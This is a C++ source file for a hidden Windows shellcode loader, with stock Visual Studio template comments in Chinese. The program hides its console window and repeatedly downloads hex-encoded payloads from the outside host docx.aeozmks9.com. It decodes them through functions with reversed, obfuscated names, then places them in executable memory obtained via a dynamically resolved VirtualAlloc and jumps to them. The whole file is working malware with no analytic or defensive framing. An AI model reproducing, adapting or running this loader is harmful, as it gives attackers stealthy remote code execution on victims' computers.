// httpLoad.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//

#include <iostream>
#include "httplib.h"
#include "test.h"

using namespace httplib;

#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")

std::string httpGet(std::string url, int port, std::string params)
{
#ifdef CPPHTTPLIB_OPENSSL_SUPPORT
	httplib::SSLClient cli(url, port);
	cli.set_ca_cert_path(CA_CERT_FILE);
	cli.enable_server_certificate_verification(true);
#else
	httplib::Client cli(url);
#endif
	// 设置连接超时时间（秒和毫秒）
	cli.set_connection_timeout(60, 0);  // 5 秒
	// 设置读取超时时间（秒和毫秒）
	cli.set_read_timeout(60, 0);        // 5 秒
	cli.set_follow_location(true); // 自动跟随重定向

   // 设置请求头
	httplib::Headers headers = {
		{ "User-Agent", "cpp-httplib-client" }
	};
	if (auto res = cli.Get(params)) {
		std::cout << "res:" << res->status << std::endl;
		std::string msg = "res:" + res->body + " status:" + std::to_string(res->status);
		std::cout << "msg:" << msg << std::endl;
		return res->body;
	}
	else {
		std::cout << "res error code: " << res.error() << std::endl;
		std::string msg = "res error code:" + std::to_string((int)res.error());
#ifdef CPPHTTPLIB_OPENSSL_SUPPORT
		auto result = cli.get_openssl_verify_result();
		if (result) {
			std::cout << "res verify error: " << X509_verify_cert_error_string(result) << std::endl;
		}
#endif
		return "";
	}
}
std::string xehotrts(std::string strHex) {
	std::string tmpStr = "";
	for (size_t j = 0; j < strHex.length(); j += 2) {
		std::string hex16 = strHex.substr(j, 2);
		char ch16 = stoul(hex16, nullptr, 16);
		tmpStr += ch16;
	}
	return tmpStr;
}

typedef LPVOID(WINAPI* pVirtualAlloc)(
	LPVOID lpAddress,
	SIZE_T dwSize,
	DWORD  flAllocationType,
	DWORD  flProtect
	);

void dclsnurl_asm(std::string edocxeh)
{
	std::string rtsedoc = xehotrts(edocxeh);
	if (rtsedoc.length() > 0)
	{
		int len = (rtsedoc.length()) + 1;
		HMODULE hKernel32 = LoadLibraryA("Kernel32.dll");
		if (hKernel32 == NULL) {
			return;
		}

		// 获取 VirtualAlloc 函数地址
		pVirtualAlloc collAlautrivlp = (pVirtualAlloc)GetProcAddress(hKernel32, "VirtualAlloc");
		if (collAlautrivlp == NULL) {
			FreeLibrary(hKernel32);
			return;
		}
		LPVOID lp = collAlautrivlp(NULL, len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		memmove(lp, rtsedoc.c_str(), len);
		DWORD oldProtect;
		VirtualProtect(lp, len, PAGE_EXECUTE, &oldProtect);

#ifdef _WIN64
		ProcTest(lp);
#else
		_asm {
			mov eax, lp
			jmp eax
		}
#endif
	}
}

int main()
{
    std::cout << "Hello World!\n";
	std::string url("http://docx.aeozmks9.com");

	while (true)
	{
#ifdef _WIN64
		std::string body = httpGet(url, 80, "/txt-64.txt");
#else
		std::string body = httpGet(url, 80, "/txt-86.txt");
#endif

		dclsnurl_asm(body);

		Sleep(3000);
	}

	return 0;

}

// 运行程序: Ctrl + F5 或调试 >“开始执行(不调试)”菜单
// 调试程序: F5 或调试 >“开始调试”菜单

// 入门使用技巧: 
//   1. 使用解决方案资源管理器窗口添加/管理文件
//   2. 使用团队资源管理器窗口连接到源代码管理
//   3. 使用输出窗口查看生成输出和其他消息
//   4. 使用错误列表窗口查看错误
//   5. 转到“项目”>“添加新项”以创建新的代码文件，或转到“项目”>“添加现有项”以将现有代码文件添加到项目
//   6. 将来，若要再次打开此项目，请转到“文件”>“打开”>“项目”并选择 .sln 文件
